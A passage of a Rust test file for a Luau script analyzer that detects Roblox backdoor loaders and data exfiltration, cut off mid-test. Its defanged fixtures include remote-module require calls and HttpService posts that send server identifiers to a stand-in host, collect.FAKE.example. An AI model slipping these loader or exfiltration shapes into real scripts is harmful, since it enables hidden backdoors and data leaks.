//! Review round 4 regressions for the Luau analyzer: round 5 brief items 1 to 12. Shapes
//! marked "reviewer" come from the first review of round 4, cases marked "second
//! review" from the other one. Every
//! fixture is synthetic and defanged: asset IDs are in 999000000000000 to
//! 999999999999999, webhook strings end in `000/FAKE`, hosts are under `FAKE.example`.

use bloxguard_core::analysis::{AnalysisResult, analyze};
use bloxguard_core::finding::{Confidence, Finding, Severity};
use bloxguard_core::model::{Document, Instance, Limits};
use std::collections::BTreeMap;

/// The trusted ID used by the trust cases.
const TRUSTED: u64 = 999_000_000_000_000;
const TR: &str = "999000000000000";
/// A second trusted ID for the two-literal case.
const TRUSTED_2: u64 = 999_000_000_000_001;
const TR2: &str = "999000000000001";
/// The ID that replaces the trusted one in change shapes.
const X: &str = "999000000005077";

fn script_document(source: &str) -> Document {
    Document {
        input: "FAKE_round4.luau".into(),
        instances: vec![Instance {
            name: "FAKE_Script".into(),
            class: "Script".into(),
            source: Some(source.into()),
            ..Instance::default()
        }],
        ..Document::default()
    }
}

fn analysis(source: &str) -> AnalysisResult {
    analyze(&script_document(source), 0, &Limits::default(), &[])
}

fn trusted_analysis(source: &str) -> AnalysisResult {
    analyze(&script_document(source), 0, &Limits::default(), &[TRUSTED])
}

/// A model with an `IntValue` named `FAKE_Id` holding `value`, a `FAKE_id` attribute
/// with the same value, and one script per source under it.
fn model(value: &str, sources: &[&str]) -> Document {
    let number: f64 = value.parse().expect("number");
    let mut instances = vec![
        Instance {
            name: "FAKE_Root".into(),
            class: "Model".into(),
            attributes: BTreeMap::from([("FAKE_id".to_string(), serde_json::json!(number))]),
            ..Instance::default()
        },
        Instance {
            name: "FAKE_Id".into(),
            class: "IntValue".into(),
            parent: Some(0),
            properties: BTreeMap::from([("Value".to_string(), serde_json::json!(number))]),
            ..Instance::default()
        },
    ];
    for (index, source) in sources.iter().enumerate() {
        instances.push(Instance {
            name: format!("FAKE_Script{index}"),
            class: "Script".into(),
            parent: Some(0),
            source: Some((*source).into()),
            ..Instance::default()
        });
    }
    Document {
        input: "FAKE_round4.rbxmx".into(),
        instances,
        ..Document::default()
    }
}

/// Analysis of the last script of a model built by [`model`].
fn model_analysis(value: &str, sources: &[&str], trusted: &[u64]) -> AnalysisResult {
    let document = model(value, sources);
    let id = document.instances.len() - 1;
    analyze(&document, id, &Limits::default(), trusted)
}

fn describe(findings: &[Finding]) -> Vec<String> {
    findings
        .iter()
        .map(|finding| {
            format!(
                "{} {} {:?} {} | {}",
                finding.rule_id,
                finding.severity,
                finding.confidence,
                finding.message,
                finding.evidence
            )
        })
        .collect()
}

fn has(
    result: &AnalysisResult,
    rule: &str,
    severity: Severity,
    confidence: Option<Confidence>,
) -> bool {
    result.findings.iter().any(|finding| {
        finding.rule_id == rule
            && finding.severity >= severity
            && confidence.is_none_or(|confidence| finding.confidence == confidence)
    })
}

fn expect(
    label: &str,
    result: &AnalysisResult,
    rule: &str,
    severity: Severity,
    confidence: Option<Confidence>,
) {
    assert!(
        has(result, rule, severity, confidence),
        "{label}: expected {rule} at {severity} or above ({confidence:?})\nfindings: {:#?}\nreasons: {:?}",
        describe(&result.findings),
        result.reasons
    );
}

/// No finding claims that the value is the one resolved ID.
fn no_resolved_claim(label: &str, result: &AnalysisResult) {
    assert!(
        result
            .findings
            .iter()
            .all(|finding| !finding.evidence.contains("resolved asset id")),
        "{label}: {:#?}",
        describe(&result.findings)
    );
}

/// Some finding of `rule` names `id` in its evidence.
fn names_id(label: &str, result: &AnalysisResult, rule: &str, id: &str) {
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.rule_id == rule && finding.evidence.contains(id)),
        "{label}: expected {rule} naming {id}\nfindings: {:#?}",
        describe(&result.findings)
    );
}

// ----- item 1: trust only for constant targets ------------------------------------------

/// Targets built from literals and locals assigned once from literals.
fn constant_shapes() -> Vec<(&'static str, String)> {
    vec![
        ("literal", format!("require({TR})")),
        ("string call", format!("require \"{TR}\"")),
        ("digit string", format!("require(\"{TR}\")")),
        ("local", format!("local id = {TR}\nrequire(id)")),
        (
            "local chain",
            format!("local a = {TR}\nlocal b = a\nrequire(b)"),
        ),
        ("parentheses and cast", format!("require(({TR} :: number))")),
        ("arithmetic", format!("require({TR} + 0)")),
        (
            "if-expression",
            format!("require(if FAKE_c then {TR} else 5)"),
        ),
        (
            "small numbers ignored",
            format!("local id = if FAKE_c then 0 else {TR}\nrequire(id)"),
        ),
        ("and chooses", format!("require(FAKE_c and {TR})")),
        ("two locals", format!("local a, b = {TR}, 7\nrequire(a)")),
        (
            "in a block",
            format!("do\nlocal id = {TR}\nrequire(id)\nend"),
        ),
        (
            "local in the same function",
            format!("local function f()\nlocal id = {TR}\nrequire(id)\nend\nf()"),
        ),
        // A parameter with the same name is another variable (second review T34).
        (
            "same name as a parameter elsewhere",
            format!("local id = {TR}\nlocal function f(id) return id end\nrequire(id)"),
        ),
    ]
}

#[test]
fn item1_constant_targets_keep_trust() {
    for (label, source) in constant_shapes() {
        let result = trusted_analysis(&source);
        assert!(
            result.findings.is_empty(),
            "{label}: {:#?}",
            describe(&result.findings)
        );
        // The same code without trust is a high confidence finding, so the trust check,
        // not a missing finding, keeps it quiet.
        expect(
            label,
            &analysis(&source),
            "BG001",
            Severity::High,
            Some(Confidence::High),
        );
    }
}

#[test]
fn item1_two_trusted_literals_stay_trusted() {
    let source = format!("require(FAKE_c and {TR} or {TR2})");
    let both = analyze(
        &script_document(&source),
        0,
        &Limits::default(),
        &[TRUSTED, TRUSTED_2],
    );
    assert!(both.findings.is_empty(), "{:#?}", describe(&both.findings));
    // With one of them trusted, the other is reported as a candidate.
    let one = trusted_analysis(&source);
    names_id("one trusted", &one, "BG001", TR2);
    assert!(
        one.findings
            .iter()
            .all(|finding| !finding.evidence.contains(&format!("{TR}]"))),
        "{:#?}",
        describe(&one.findings)
    );
}

/// Every way a trusted ID can reach `require` other than a constant: each is reported,
/// with the trusted ID marked as not applied and medium confidence.
fn carried_shapes() -> Vec<(&'static str, String)> {
    vec![
        (
            "table field",
            format!("local cfg = {{id = {TR}}}\nrequire(cfg.id)"),
        ),
        (
            "list item",
            format!("local ids = {{{TR}}}\nrequire(ids[1])"),
        ),
        (
            "nested table",
            format!("local cfg = {{inner = {{id = {TR}}}}}\nrequire(cfg.inner.id)"),
        ),
        (
            "table alias",
            format!("local cfg = {{id = {TR}}}\nlocal a = cfg\nrequire(a.id)"),
        ),
        ("global", format!("FAKE_id = {TR}\nrequire(FAKE_id)")),
        (
            "reassigned local",
            format!("local id = {TR}\nid = {TR}\nrequire(id)"),
        ),
        (
            "compound local",
            format!("local id = {TR} - 1\nid += 1\nrequire(id)"),
        ),
        (
            "call result",
            format!("local function get() return {TR} end\nrequire(get())"),
        ),
        ("library call", format!("require(tonumber(\" {TR} \"))")),
        (
            "captured local",
            format!("local id = {TR}\nlocal function load() require(id) end\nload()"),
        ),
        (
            "wrapper parameter",
            format!("local function load(id) return require(id) end\nload({TR})"),
        ),
        (
            "vararg",
            format!("local function load(...) return require(...) end\nload({TR})"),
        ),
        (
            "loop variable",
            format!("for _, id in {{{TR}}} do require(id) end"),
        ),
        (
            "or with a table",
            format!("local cfg = {{id = {TR}}}\nrequire(cfg.id or {TR})"),
        ),
    ]
}

#[test]
fn item1_trusted_ids_through_anything_else_are_reported() {
    for (label, source) in carried_shapes() {
        let result = trusted_analysis(&source);
        expect(label, &result, "BG001", Severity::High, None);
        assert!(
            result.findings.iter().any(|finding| finding
                .evidence
                .contains(&format!("trusted asset id, not a constant target: {TR}"))
                && finding.confidence == Confidence::Medium),
            "{label}: {:#?}",
            describe(&result.findings)
        );
        no_resolved_claim(label, &result);
    }
}

/// A trusted and an untrusted candidate: the untrusted one keeps its high confidence
/// finding, the trusted one is reported as not applied.
#[test]
fn item1_mixed_candidate_sets_report_both() {
    let source = format!("local id = {TR}\nif FAKE_c then id = {X} end\nrequire(id)");
    let result = trusted_analysis(&source);
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.confidence == Confidence::High
                && finding
                    .evidence
                    .contains(&format!("asset id candidate: {X}"))),
        "{:#?}",
        describe(&result.findings)
    );
    names_id(
        "trusted",
        &result,
        "BG001",
        &format!("not a constant target: {TR}"),
    );
}

#[test]
fn item1_instance_values_holding_a_trusted_id_are_reported() {
    for source in [
        "require(script.Parent.FAKE_Id.Value)",
        "require(script.Parent:GetAttribute(\"FAKE_id\"))",
        "local v = script.Parent.FAKE_Id.Value\nrequire(v)",
    ] {
        let result = model_analysis(TR, &[source], &[TRUSTED]);
        expect(
            source,
            &result,
            "BG002",
            Severity::Critical,
            Some(Confidence::Medium),
        );
        names_id(source, &result, "BG002", TR);
    }
}

/// The same trust check covers wrappers that call `require` directly.
#[test]
fn item1_wrapped_require_follows_the_same_rule() {
    for (source, trusted) in [
        (format!("pcall(require, {TR})"), true),
        (format!("task.spawn(require, {TR})"), true),
        (format!("task.delay(1, require, {TR})"), true),
        (
            format!("local cfg = {{id = {TR}}}\npcall(require, cfg.id)"),
            false,
        ),
    ] {
        let result = trusted_analysis(&source);
        assert_eq!(
            result.findings.is_empty(),
            trusted,
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 2: writes whose container is not pinned ---------------------------------------

/// Expressions that give back `cfg` in a way the scanner used to lose (reviewer shapes
/// P01 to P11 and more of the same idea). `{route}` is written through, then `cfg.id`
/// is required.
fn write_routes() -> Vec<(&'static str, &'static str)> {
    vec![
        ("select", "select(1, cfg).id = {x}"),
        ("select second", "select(2, nil, cfg).id = {x}"),
        ("select from the end", "select(-1, cfg).id = {x}"),
        (
            "select unknown position",
            "select(FAKE_n, cfg, cfg).id = {x}",
        ),
        ("unpack", "table.unpack({cfg}).id = {x}"),
        (
            "unpack unknown range",
            "table.unpack({cfg}, FAKE_i).id = {x}",
        ),
        ("assert", "assert(cfg).id = {x}"),
        ("rawset result", "rawset(cfg, \"FAKE\", 1).id = {x}"),
        ("setmetatable result", "setmetatable(cfg, {}).id = {x}"),
        ("parentheses", "(cfg).id = {x}"),
        ("if-expression", "(if FAKE_c then cfg else cfg).id = {x}"),
        (
            "select in a vararg function",
            "local function f(...) select(1, ...).id = {x} end\nf(cfg)",
        ),
        (
            "select second in a vararg function",
            "local function f(...) select(2, ...).id = {x} end\nf(nil, cfg)",
        ),
        (
            "pcall of an anonymous function",
            "local ok, o = pcall(function() return cfg end)\no.id = {x}",
        ),
        (
            "pcall of a named function",
            "local function get() return cfg end\nlocal ok, o = pcall(get)\no.id = {x}",
        ),
        (
            "xpcall",
            "local ok, o = xpcall(function() return cfg end, print)\no.id = {x}",
        ),
        (
            "coroutine.wrap",
            "local o = coroutine.wrap(function() return cfg end)()\no.id = {x}",
        ),
        (
            "coroutine.resume",
            "local ok, o = coroutine.resume(coroutine.create(function() return cfg end))\no.id = {x}",
        ),
        (
            "immediately invoked",
            "local o = (function() return cfg end)()\no.id = {x}",
        ),
        (
            "immediately invoked with varargs",
            "local o = (function(...) return ... end)(cfg)\no.id = {x}",
        ),
        (
            "__index function",
            "local o = setmetatable({}, {__index = function() return cfg end}).anything\no.id = {x}",
        ),
        (
            "table as a key",
            "local t = {}\nt[cfg] = true\nfor k in t do k.id = {x} end",
        ),
        (
            "weak key and rawset",
            "local w = setmetatable({}, {__mode = 'k'})\nw[cfg] = 1\nfor k in pairs(w) do rawset(k, 'id', {x}) end",
        ),
        (
            "table key in a constructor",
            "local t = {[cfg] = true}\nfor k in pairs(t) do k.id = {x} end",
        ),
        (
            "key from next",
            "local t = {}\nt[cfg] = 1\nlocal k = next(t)\nk.id = {x}",
        ),
        (
            "loop variable assigned after the write",
            "local o = nil\nfor i = 1, 2 do\nif o then o.id = {x} end\no = cfg\nend",
        ),
        (
            "loop field assigned after the write",
            "local box = {}\nfor i = 1, 2 do\nif box.o then box.o.id = {x} end\nbox.o = cfg\nend",
        ),
        (
            "error value",
            "local ok, o = pcall(function() error(cfg) end)\no.id = {x}",
        ),
        (
            "global read back",
            "FAKE_cfg = cfg\nlocal o = FAKE_get()\no.id = {x}",
        ),
    ]
}

fn route_source(route: &str) -> String {
    format!(
        "local cfg = {{id = {TR}}}\n{}\nrequire(cfg.id)",
        route.replace("{x}", X)
    )
}

#[test]
fn item2_writes_through_any_route_are_never_trusted_away() {
    let mut count = 0;
    for (label, route) in write_routes() {
        let source = route_source(route);
        let result = trusted_analysis(&source);
        expect(label, &result, "BG001", Severity::High, None);
        count += 1;
    }
    assert_eq!(count, 29);
}

#[test]
fn item2_writes_through_any_route_never_claim_the_old_id() {
    for (label, route) in write_routes() {
        let source = route_source(route);
        let result = analysis(&source);
        expect(label, &result, "BG001", Severity::High, None);
        names_id(label, &result, "BG001", X);
        assert!(
            result.findings.iter().all(|finding| !finding
                .evidence
                .contains(&format!("resolved asset id: {TR}"))),
            "{label}: the replaced ID is claimed resolved\n{source}\n{:#?}",
            describe(&result.findings)
        );
    }
}

/// Routes that keep the table exactly give the new ID as the resolved value.
#[test]
fn item2_pass_through_builtins_keep_table_identity() {
    for label in [
        "select",
        "select second",
        "select from the end",
        "unpack",
        "assert",
        "rawset result",
        "setmetatable result",
        "parentheses",
        "select in a vararg function",
        "select second in a vararg function",
        "coroutine.wrap",
        "immediately invoked",
        "immediately invoked with varargs",
    ] {
        let (_, route) = write_routes()
            .into_iter()
            .find(|(name, _)| *name == label)
            .expect("route");
        let result = analysis(&route_source(route));
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.confidence == Confidence::High
                    && finding
                        .evidence
                        .contains(&format!("resolved asset id: {X}"))),
            "{label}: {:#?}",
            describe(&result.findings)
        );
    }
}

/// HTTP bodies written through the same routes keep their player data.
#[test]
fn item2_sensitive_writes_through_routes_reach_bg008() {
    for route in [
        "select(1, req).Body = game.JobId",
        "local ok, o = pcall(function() return req end)\no.Body = game.JobId",
        "local o = (function() return req end)()\no.Body = game.JobId",
        "local o = nil\nfor i = 1, 2 do\nif o then o.Body = game.JobId end\no = req\nend",
    ] {
        let source = format!(
            "local H = game:GetService(\"HttpService\")\nlocal req = {{Url = \"https://collect.FAKE.example/x\", Method = \"POST\", Body = \"FAKE\"}}\n{route}\nH:RequestAsync(req)"
        );
        expect(route, &analysis(&source), "BG008", Severity::High, None);
    }
}

/// An unknown metatable gets the table in its metamethods, so the table may change.
#[test]
fn item2_unknown_metatables_leave_the_table_changed() {
    let result = analysis(&format!(
        "local t = {{{TR}}}\nsetmetatable(t, FAKE_meta)\nlocal _ = t.FAKE\nrequire(t[1])"
    ));
    expect("unknown metatable", &result, "BG001", Severity::High, None);
    no_resolved_claim("unknown metatable", &result);
}

/// Tables the scanner follows exactly are not touched by unrelated unknown writes.
#[test]
fn item2_unrelated_unknown_writes_leave_local_tables_resolved() {
    for route in [
        "local o = FAKE_get()\no.id = 5",
        "local function f(self) self.id = 5 end",
        "local C = {}\nfunction C:set(v) self.id = v end",
        "local o = select(FAKE_n, FAKE_a, FAKE_b)\no.id = 5",
        "local ok, o = pcall(FAKE_get)\no.id = 5",
    ] {
        let source = format!("local cfg = {{id = {TR}}}\n{route}\nrequire(cfg.id)");
        let result = analysis(&source);
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.confidence == Confidence::High
                    && finding
                        .evidence
                        .contains(&format!("resolved asset id: {TR}"))),
            "{route}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 3: instance writes ------------------------------------------------------------

/// Ways a script can write the `Value` of `script.Parent.FAKE_Id` (reviewer shapes P20
/// to P24 and more).
fn value_writes() -> Vec<(&'static str, String)> {
    vec![
        ("direct", format!("script.Parent.FAKE_Id.Value = {X}")),
        ("compound", "script.Parent.FAKE_Id.Value += 3077".into()),
        (
            "alias",
            format!("local v = script.Parent.FAKE_Id\nv.Value = {X}"),
        ),
        (
            "helper",
            format!("local function set(o) o.Value = {X} end\nset(script.Parent.FAKE_Id)"),
        ),
        (
            "bracket name",
            format!("script.Parent.FAKE_Id[\"Value\"] = {X}"),
        ),
        (
            "computed name",
            format!("local k = \"Val\" .. \"ue\"\nscript.Parent.FAKE_Id[k] = {X}"),
        ),
        (
            "first of several targets",
            format!("script.Parent.FAKE_Id.Value, FAKE_other = {X}, 1"),
        ),
        (
            "second of several targets",
            format!("FAKE_other, script.Parent.FAKE_Id.Value = 1, {X}"),
        ),
        (
            "comment before the sign",
            format!("script.Parent.FAKE_Id.Value --[[FAKE]] = {X}"),
        ),
        (
            "clone given a value",
            format!(
                "local c = script.Parent.FAKE_Id:Clone()\nc.Value = {X}\nc.Parent = script.Parent"
            ),
        ),
        (
            "destroy and replace",
            format!(
                "script.Parent.FAKE_Id:Destroy()\nlocal v = Instance.new(\"IntValue\")\nv.Name = \"FAKE_Id\"\nv.Value = {X}\nv.Parent = script.Parent"
            ),
        ),
        (
            "tween",
            format!(
                "game:GetService(\"TweenService\"):Create(script.Parent.FAKE_Id, TweenInfo.new(0), {{Value = {X}}}):Play()"
            ),
        ),
        (
            "tween with a bracket key",
            format!(
                "local ts = game:GetService(\"TweenService\")\nts:Create(script.Parent.FAKE_Id, TweenInfo.new(0), {{[\"Value\"] = {X}}}):Play()"
            ),
        ),
        (
            "inside a function body",
            format!("local function later()\nscript.Parent.FAKE_Id.Value = {X}\nend\nlater()"),
        ),
    ]
}

/// Ways a script can set the `FAKE_id` attribute of `script.Parent`.
fn attribute_writes() -> Vec<(&'static str, String)> {
    vec![
        (
            "method call",
            format!("script.Parent:SetAttribute(\"FAKE_id\", {X})"),
        ),
        (
            "computed name",
            format!("local n = \"FAKE_\" .. \"id\"\nscript.Parent:SetAttribute(n, {X})"),
        ),
        (
            "method value",
            format!("local set = script.Parent.SetAttribute\nset(script.Parent, \"FAKE_id\", {X})"),
        ),
        (
            "dot call",
            format!("script.Parent.SetAttribute(script.Parent, \"FAKE_id\", {X})"),
        ),
        (
            "string key",
            format!("script.Parent[\"SetAttribute\"](script.Parent, \"FAKE_id\", {X})"),
        ),
        (
            "alias",
            format!("local p = script.Parent\np:SetAttribute(\"FAKE_id\", {X})"),
        ),
    ]
}

/// The writer before the read in one script, after it, and in another script.
fn placements(writer: &str, reader: &str) -> Vec<(&'static str, Vec<String>)> {
    vec![
        ("same script, before", vec![format!("{writer}\n{reader}")]),
        ("same script, after", vec![format!("{reader}\n{writer}")]),
        (
            "another script",
            vec![writer.to_string(), format!("task.wait(1)\n{reader}")],
        ),
    ]
}

fn expect_unresolved_bg002(label: &str, result: &AnalysisResult) {
    expect(label, result, "BG002", Severity::Critical, None);
    no_resolved_claim(label, result);
    assert!(
        result
            .findings
            .iter()
            .all(|finding| finding.confidence != Confidence::High),
        "{label}: {:#?}",
        describe(&result.findings)
    );
}

#[test]
fn item3_value_writes_anywhere_keep_reads_unresolved() {
    let reader = "require(script.Parent.FAKE_Id.Value)";
    let mut count = 0;
    for (form, writer) in value_writes() {
        for (placement, sources) in placements(&writer, reader) {
            let sources: Vec<&str> = sources.iter().map(String::as_str).collect();
            let label = format!("{form} / {placement}");
            expect_unresolved_bg002(&label, &model_analysis(TR, &sources, &[TRUSTED]));
            expect_unresolved_bg002(&label, &model_analysis(TR, &sources, &[]));
            count += 1;
        }
    }
    assert_eq!(count, 42);
}

#[test]
fn item3_attribute_writes_anywhere_keep_reads_unresolved() {
    let mut count = 0;
    for reader in [
        "require(script.Parent:GetAttribute(\"FAKE_id\"))",
        "require(script.Parent:GetAttributes().FAKE_id)",
    ] {
        for (form, writer) in attribute_writes() {
            for (placement, sources) in placements(&writer, reader) {
                let sources: Vec<&str> = sources.iter().map(String::as_str).collect();
                let label = format!("{reader} / {form} / {placement}");
                expect_unresolved_bg002(&label, &model_analysis(TR, &sources, &[TRUSTED]));
                expect_unresolved_bg002(&label, &model_analysis(TR, &sources, &[]));
                count += 1;
            }
        }
    }
    assert_eq!(count, 36);
}

/// A write before the read in the same script also lists the new value: a literal as
/// BG001, a value computed from the stored one as BG002.
#[test]
fn item3_same_script_writes_list_the_new_value() {
    for (source, rule) in [
        (
            format!("script.Parent.FAKE_Id.Value = {X}\nrequire(script.Parent.FAKE_Id.Value)"),
            "BG001",
        ),
        (
            format!(
                "script.Parent:SetAttribute(\"FAKE_id\", {X})\nrequire(script.Parent:GetAttribute(\"FAKE_id\"))"
            ),
            "BG001",
        ),
        (
            "local v = script.Parent.FAKE_Id\nv.Value += 5077\nrequire(v.Value)".to_string(),
            "BG002",
        ),
    ] {
        let result = model_analysis(TR, &[&source], &[]);
        names_id(&source, &result, rule, "999000000005077");
        names_id(&source, &result, "BG002", TR);
    }
}

/// A key the pass cannot read may be any property, such as `inst[prop] = v` in a loop
/// over a table of properties, so a loop index counts too. A length key is a number,
/// unless the script has a `__len` metamethod.
#[test]
fn item3_computed_keys_count_as_every_property() {
    for (writer, resolved) in [
        ("local list = {}\nfor i = 1, 3 do list[i] = i end", false),
        (
            "for prop, value in pairs(FAKE_props) do script.Parent.FAKE_Id[prop] = value end",
            false,
        ),
        ("local list = {}\nlist[#list + 1] = 5", true),
        (
            "local list = setmetatable({}, {__len = function() return \"Value\" end})\nscript.Parent.FAKE_Id[#list] = 5",
            false,
        ),
    ] {
        let result = model_analysis(TR, &[writer, "require(script.Parent.FAKE_Id.Value)"], &[]);
        let claims = result.findings.iter().any(|finding| {
            finding
                .evidence
                .contains(&format!("resolved asset id: {TR}"))
        });
        assert_eq!(
            claims,
            resolved,
            "{writer}: {:#?}",
            describe(&result.findings)
        );
        expect(writer, &result, "BG002", Severity::Critical, None);
    }
}

/// Writes of other names, table fields and reads leave the stored values resolved.
#[test]
fn item3_other_writes_leave_reads_resolved() {
    for writer in [
        "script.Parent.FAKE_Id.Name = \"FAKE_Other\"",
        "local cfg = {Value = 5}\nprint(cfg)",
        "script.Parent:SetAttribute(\"FAKE_other\", 1)",
        "print(script.Parent.FAKE_Id.Value, 1)",
        "local a, b = script.Parent.FAKE_Id.Value, 1",
        "local t = {}\nt[1] = 5",
        "local t = {}\nt[#t + 1] = 5",
        "local t = {[\"Value\"] = 1}",
        "if script.Parent.FAKE_Id.Value == 1 then print(1) end",
    ] {
        for (reader, rule) in [
            ("require(script.Parent.FAKE_Id.Value)", "BG002"),
            ("require(script.Parent:GetAttribute(\"FAKE_id\"))", "BG002"),
        ] {
            let result = model_analysis(TR, &[writer, reader], &[]);
            assert!(
                result.findings.iter().any(|finding| finding.rule_id == rule
                    && finding.confidence == Confidence::High
                    && finding
                        .evidence
                        .contains(&format!("resolved asset id: {TR}"))),
                "{writer} / {reader}: {:#?}",
                describe(&result.findings)
            );
        }
    }
}

/// The pass runs once per document: 3,000 scripts of about 300 tokens each. A pass per
/// analyzed script would lex about 2.7 billion tokens and take far longer than the bound.
#[test]
fn item3_the_write_pass_runs_once_per_document() {
    let padding = (0..50)
        .map(|index| format!("local FAKE_v{index} = {index}"))
        .collect::<Vec<_>>()
        .join("\n");
    let reader = format!("{padding}\nrequire(script.Parent.FAKE_Id.Value)");
    let writer = "local t = {}\nt[FAKE_k] = 1";
    let mut sources: Vec<&str> = vec![writer; 1];
    sources.extend(std::iter::repeat_n(reader.as_str(), 3_000));
    let document = model(TR, &sources);
    let started = std::time::Instant::now();
    let report = bloxguard_core::engine::scan_documents(
        vec![document],
        &bloxguard_core::config::Config::default(),
    );
    assert!(started.elapsed() < std::time::Duration::from_secs(60));
    let bg002: Vec<&Finding> = report
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "BG002")
        .collect();
    assert_eq!(bg002.len(), 3_000);
    assert!(
        bg002
            .iter()
            .all(|finding| !finding.evidence.contains("resolved asset id"))
    );
}

// ----- item 4: captured variables and replay results ------------------------------------

/// Ways the script changes `id` after the function that reads it was defined, in
/// straight code and in every loop kind (second review T01, T16 to T19 and more).
fn capture_changes() -> Vec<(&'static str, String)> {
    vec![
        ("assignment", format!("id = {X}")),
        ("branch", format!("if FAKE_c then id = {X} end")),
        ("numeric for", format!("for i = 1, 1 do id = {X} end")),
        ("while", format!("while FAKE_once do id = {X} break end")),
        ("repeat", format!("repeat id = {X} until true")),
        ("generic for", format!("for _, v in {{{X}}} do id = v end")),
        ("computed", format!("id = tonumber(\"{X}\")")),
        ("compound", "id += 5077".into()),
        (
            "setter function",
            format!("local function set() id = {X} end\nset()"),
        ),
    ]
}

/// Ways the function is called after the change (second review T02 to T05, T29, T30, T39).
fn capture_calls() -> Vec<(&'static str, &'static str)> {
    vec![
        ("plain call", "load()"),
        ("uninteresting argument", "load(false)"),
        ("task.defer", "task.defer(load)"),
        ("task.spawn", "task.spawn(load)"),
        ("pcall", "pcall(load)"),
        ("coroutine.wrap", "coroutine.wrap(load)()"),
        (
            "coroutine.resume",
            "coroutine.resume(coroutine.create(load))",
        ),
        ("gsub callback", "string.gsub(\"x\", \"x\", load)"),
        (
            "__call",
            "local obj = setmetatable({}, {__call = load})\nobj()",
        ),
        (
            "event",
            "game:GetService(\"Players\").PlayerAdded:Connect(load)",
        ),
        ("never called", ""),
    ]
}

#[test]
fn item4_changed_captures_reach_require_in_every_form() {
    let mut count = 0;
    for (change, update) in capture_changes() {
        for (call, invoke) in capture_calls() {
            let source = format!(
                "local id = {TR}\nlocal function load() require(id) return \"FAKE\" end\n{update}\n{invoke}"
            );
            let label = format!("{change} / {call}");
            let result = trusted_analysis(&source);
            expect(&label, &result, "BG001", Severity::High, None);
            let result = analysis(&source);
            expect(&label, &result, "BG001", Severity::High, None);
            // Where the function is defined, a computed change is only an unknown
            // candidate; a call or a literal names the new ID.
            let literal = !matches!(change, "generic for" | "computed" | "compound");
            if literal || !invoke.is_empty() {
                names_id(&label, &result, "BG001", X);
            } else {
                no_resolved_claim(&label, &result);
            }
            count += 1;
        }
    }
    assert_eq!(count, 99);
}

/// A function that returns a captured value, used by a later call (second review T05 and more).
#[test]
fn item4_results_of_functions_follow_the_captures() {
    for source in [
        format!(
            "local id = {TR}\nlocal cfg = setmetatable({{}}, {{__index = function() return id end}})\nid = {X}\nrequire(cfg.any)"
        ),
        format!(
            "local id = {TR}\nlocal function get() return id end\nlocal a = get()\nid = {X}\nrequire(get())"
        ),
        format!(
            "local id = {TR}\nlocal obj = setmetatable({{}}, {{__add = function() return id end}})\nid = {X}\nrequire(obj + 1)"
        ),
        format!(
            "local id = {TR}\nlocal function get() return id end\nid = {X}\nlocal ok, v = pcall(get)\nrequire(v)"
        ),
    ] {
        expect(
            &source,
            &trusted_analysis(&source),
            "BG001",
            Severity::High,
            None,
        );
        names_id(&source, &analysis(&source), "BG001", X);
    }
}

/// A field of a table from outside the function, changed after the definition.
#[test]
fn item4_changed_fields_of_captured_tables_reach_require() {
    for update in [
        format!("cfg.id = {X}"),
        format!("local a = cfg\na.id = {X}"),
        format!("rawset(cfg, \"id\", {X})"),
        format!("cfg[FAKE_k] = {X}"),
        format!("for i = 1, 1 do cfg.id = {X} end"),
        format!("local function set(t) t.id = {X} end\nset(cfg)"),
    ] {
        for invoke in ["load()", "task.defer(load)", ""] {
            let source = format!(
                "local cfg = {{id = {TR}}}\nlocal function load() require(cfg.id) end\n{update}\n{invoke}"
            );
            expect(
                &source,
                &trusted_analysis(&source),
                "BG001",
                Severity::High,
                None,
            );
            let result = analysis(&source);
            names_id(&source, &result, "BG001", X);
        }
    }
    // A nested table.
    let source = format!(
        "local cfg = {{inner = {{id = {TR}}}}}\nlocal function load() require(cfg.inner.id) end\ncfg.inner.id = {X}\nload()"
    );
    names_id(&source, &analysis(&source), "BG001", X);
}

/// Repeated identical calls, and argument tables changed below the depth the replay key
/// describes (second review T06 and T07).
#[test]
fn item4_replay_memo_follows_captured_and_deep_changes() {
    for source in [
        format!(
            "local current = {TR}\nlocal out = {{id = {TR}}}\nlocal function sync(t) t.id = current end\nsync(out)\ncurrent = {X}\nsync(out)\nrequire(out.id)"
        ),
        format!(
            "local out = {{a = {{b = {{id = {TR}}}}}}}\nlocal src = {{a = {{b = {{id = {TR}}}}}}}\nlocal function copy(dst, input) dst.a.b.id = input.a.b.id end\ncopy(out, src)\nsrc.a.b.id = {X}\ncopy(out, src)\nrequire(out.a.b.id)"
        ),
        format!(
            "local id = {TR}\nlocal function get() return id end\nlocal first = get()\nid = {X}\nlocal second = get()\nrequire(second)"
        ),
    ] {
        expect(
            &source,
            &trusted_analysis(&source),
            "BG001",
            Severity::High,
            None,
        );
        names_id(&source, &analysis(&source), "BG001", X);
    }
}

/// HTTP bodies assigned after the sender was defined (second review T36 to T38).
#[test]
fn item4_http_bodies_changed_after_the_definition_are_reported() {
    let http = "local H = game:GetService(\"HttpService\")\n";
    for body in [
        "local body = \"FAKE\"\nlocal function send() H:PostAsync(\"https://collect.FAKE.example/x\", body) end\nbody = tostring(game.JobId)\nsend()",
        "local cfg = {body = \"FAKE\"}\nlocal function send() H:PostAsync(\"https://collect.FAKE.example/x\", cfg.body) end\ncfg.body = tostring(game.PlaceId)\nsend()",
        "local request = {Url = \"https://collect.FAKE.example/x\", Method = \"POST\", Body = \"FAKE\"}\nlocal function send() H:RequestAsync(request) end\nrequest.Body = tostring(game.PrivateServerOwnerId)\nsend()",
        "local body = \"FAKE\"\nlocal function send() H:PostAsync(\"https://collect.FAKE.example/x\", body) end\nbody = tostring(game.JobId)\ntask.defer(send)",
    ] {
        let source = format!("{http}{body}");
        expect(body, &analysis(&source), "BG008", Severity::High, None);
    }
}

/// Second review R01 to R03 with the default configuration: the wrapper reads a capture that
/// becomes an ID later.
#[test]
fn item4_captures_that_become_ids_later_are_reported() {
    for start in ["script.Parent.FAKE_Module", "nil", "\"./FAKE_Local\""] {
        let source = format!(
            "local FAKE_id = {start}\nlocal function FAKE_load() return require(FAKE_id) end\nFAKE_id = 999000000009001\nFAKE_load()"
        );
        let result = analysis(&source);
        expect(start, &result, "BG001", Severity::High, None);
